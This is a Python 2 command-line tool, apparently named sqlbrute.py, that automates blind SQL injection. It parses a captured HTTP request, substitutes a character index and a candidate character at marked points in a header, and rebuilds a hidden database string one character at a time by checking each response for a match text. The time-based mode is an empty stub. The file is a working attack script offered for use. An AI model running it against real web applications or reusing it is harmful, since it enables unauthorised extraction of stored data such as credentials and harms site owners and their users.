import sys
import getopt
import re
import requests
import time


injectionText = 'POINT2'
injectionLength = 'POINT1'
charset = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
           'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
           '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '.', '@', '-', '_', ',', '!', '#', '$', '(', ')', ':']
protocol = 'http://'
proxies = {'http': 'http://127.0.0.1:8080'}
sleepTime = 0.1


def sendRequest(headers):
    time.sleep(sleepTime)
    url = protocol + headers['Host'] + headers['URL']
    requestType = headers['Type']
    tempHeaders = headers
    if (requestType == 'GET'):
        response = requests.get(url, headers=tempHeaders, proxies=proxies)
        content = response.content
        return content


def injectForText(headers, text):
    urlpart1 = ''
    urlpart2 = ''
    urlpart3 = ''
    injectableHeader = ''
    substringCounter = 0
    foundIt = False
    foundString = ''

    for header in headers:
        if (injectionText in headers[header]) and (injectionLength in headers[header]):
            urlpart1 = headers[header].split(injectionLength)[0]
            urlpart2 = headers[header].split(injectionLength)[
                1].split(injectionText)[0]
            urlpart3 = headers[header].split(injectionLength)[
                1].split(injectionText)[1]
            injectableHeader = header

    while (foundIt is False):
        substringCounter = substringCounter + 1
        foundChar = False
        for i in charset:
            if (foundChar is False):
                payload = urlpart1 + \
                    str(substringCounter) + urlpart2 + str(i) + urlpart3
                # print payload
                headers[injectableHeader] = payload
                response = sendRequest(headers)
                print '{0}\r'.format(payload),
                if text in response:
                    urlpart2 = urlpart2 + str(i)
                    foundString = foundString + str(i)
                    foundChar = True
        if foundChar is False:
            foundIt = True
            print '\n' + 'FOUND: ' + foundString


def injectForTime(headers):
    print 'tralala'


def parseRequest(inputfile):
    file = open(inputfile)
    headers = {}
    for line in file:
        brokenline = re.split('\s', line, 1)
        if (brokenline[0] == 'GET') or (brokenline[0] == 'POST'):
            requestType = brokenline[0]
            requestURL = brokenline[1]
        else:
            headers[brokenline[0].split(':')[0]] = brokenline[1].split('\n')[0]
    headers['Type'] = requestType
    headers['URL'] = requestURL.split(" ")[0]
    file.close()
    return headers


def main(argv):
    inputfile = ''
    sqlitype = ''
    text = ''

    try:
        opts, args = getopt.getopt(
            argv, "hi:s:t:", ["ifile=", "sqlitype=", "textmatch="])
    except getopt.GetoptError:
        print 'sqlbrute.py -i <inputfile> -s <sqlitype> -t <textmatch>'
        sys.exit(2)
    for opt, arg in opts:
        if opt == '-h':
            print 'sqlbrute.py -i <inputfile> -s <sqlitype> -t <textmatch>'
            sys.exit()
        elif opt in ("-i", "--ifile"):
            inputfile = arg
        elif opt in ("-s", "--sqlitype"):
            sqlitype = arg
        elif opt in ("-t", "--text"):
            text = arg
    headers = parseRequest(inputfile)
    if sqlitype == 'text':
        injectForText(headers, text)
    elif sqlitype == 'time':
        injectForTime(headers)


if __name__ == "__main__":
    main(sys.argv[1:])
